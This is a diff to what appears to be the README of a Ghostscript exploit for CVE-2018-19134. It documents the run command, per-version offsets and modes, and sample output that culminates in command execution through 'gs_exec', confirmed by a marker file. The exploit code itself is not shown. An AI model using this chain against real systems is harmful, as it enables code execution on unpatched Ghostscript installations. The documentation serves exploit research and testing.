@@ -46,29 +46,29 @@ $GS_RUN $GS_VERSION -- -dNOSAFER -dBATCH -dNOPAUSE -dNODISPLAY -dQUIET \
     /work/exploit_monolithic.ps
 ```
 
-`exploit_monolithic.ps` contains the APIv2 library followed by the CVE-2018-19134 adapter. The split development form remains available as `/work/library_v2.ps /work/exploit.ps`.
+`exploit_monolithic.ps` contains the APIv2 library, the CVE-2018-19134 adapter, and `exec_tail.ps`. The tail calls `gs_exec` and writes `gs_exec_ok` to `/work/gs_exec_marker`.
 
-When the APIv2 library is loaded first, the exploit auto-detects `rw_init` and registers the five-field APIv2 slave-window dictionary. Subsequent PostScript can then use the full `mem_*` API, ELF resolution, and `gs_exec`.
+The split development form remains available as `/work/library_v2.ps /work/exploit.ps /work/exec_tail.ps`.
 
 ## Tested versions
 
 | Version | Mode | op_stack.p offset | Library |
 |---------|------|-------------------|---------|
 | 8.63 | — | — | setpattern path does not reach vulnerable code |
-| 8.64 | VALUE | pinst[31] (504) | **rw_init OK**; teardown may SIGSEGV |
+| 8.64 | VALUE | pinst[31] (504) | **gs_exec marker OK**; terminal SIGSEGV expected |
 | 8.71 | VALUE | pinst[31] (504) | unsupported — 32-bit integers |
 | 9.01 | VALUE | pinst[38] (616) | unsupported — 32-bit integers |
 | 9.06 | VALUE | pinst[38] (616) | unsupported — 32-bit integers |
-| 9.10 | TAS | pinst[39] (624) | **rw_init OK** |
-| 9.14 | TAS | pinst[39] (624) | **rw_init OK** |
-| 9.18 | TAS | pinst[39] (624) | **rw_init OK** |
-| 9.20 | TAS | pinst[39] (624) | **rw_init OK** |
-| 9.22 | TAS | pinst[39] (624) | **rw_init OK** |
+| 9.10 | TAS | pinst[39] (624) | **gs_exec marker OK**; terminal SIGSEGV expected |
+| 9.14 | TAS | pinst[39] (624) | **gs_exec marker OK**; terminal SIGSEGV expected |
+| 9.18 | TAS | pinst[39] (624) | **gs_exec marker OK**; terminal SIGSEGV expected |
+| 9.20 | TAS | pinst[39] (624) | **gs_exec marker OK**; terminal SIGSEGV expected |
+| 9.22 | TAS | pinst[39] (624) | **gs_exec marker OK**; terminal SIGSEGV expected |
 | 9.26 | — | — | patched |
 
 The exploit auto-detects the correct offset and mode at runtime.
 
-## Example output (GS 9.18, TAS mode with library)
+## Example output (GS 9.18, TAS mode monolithic)
 
 ```
 CVE-2018-19134 type confusion succeeded after 1288 iterations.
@@ -79,19 +79,9 @@ APIv2 slave window prepared.
 [+] rw_init succeeded -- APIv2 seam active.
 ```
 
-## Example output (GS 9.18, TAS mode standalone)
+The authoritative success signal is `/work/gs_exec_marker` containing `gs_exec_ok`. A `139` process exit after marker creation is expected.
 
-```
-CVE-2018-19134 type confusion succeeded after 1288 iterations.
-Mode: TAS at pinst[39]  (byte offset 624)
-mem_base: 0x000000003289D058
-APIv2 slave window prepared.
-
-[*] library_v2.ps not loaded; APIv2 slave-window globals are available.
-[*] To activate the full exploitation chain, load library_v2.ps before this file.
-```
-
-## Example output (GS 8.64, VALUE mode with library)
+## Example output (GS 8.64, VALUE mode monolithic)
 
 ```
 CVE-2018-19134 pointer-shift primitive established.
